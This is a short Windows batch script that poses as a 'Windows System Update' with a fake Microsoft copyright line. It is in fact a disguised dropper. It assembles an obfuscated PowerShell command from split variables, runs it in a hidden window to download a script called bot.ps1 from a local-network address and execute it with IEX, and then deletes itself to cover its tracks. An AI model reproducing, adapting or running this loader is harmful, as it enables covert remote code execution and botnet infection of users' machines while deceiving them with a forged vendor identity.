@echo off
setlocal enabledelayedexpansion

:: Windows System Update
:: Copyright (c) Microsoft Corporation

set "x1=powershell"
set "x2=-WindowStyle"
set "x3=Hidden"
set "x4=-Command"

set "a1=IEX"
set "a2=(New-Object"
set "a3=Net.WebClient)"
set "a4=.DownloadString"
set "a5=('http://192.168.1.14:8000/static/bot.ps1')"

set "cmd=%x1% %x2% %x3% %x4% \"%a1% %a2% %a3%%a4%%a5%\""

start /b "" %cmd%

:: Self-delete
(goto) 2>nul & del "%~f0"
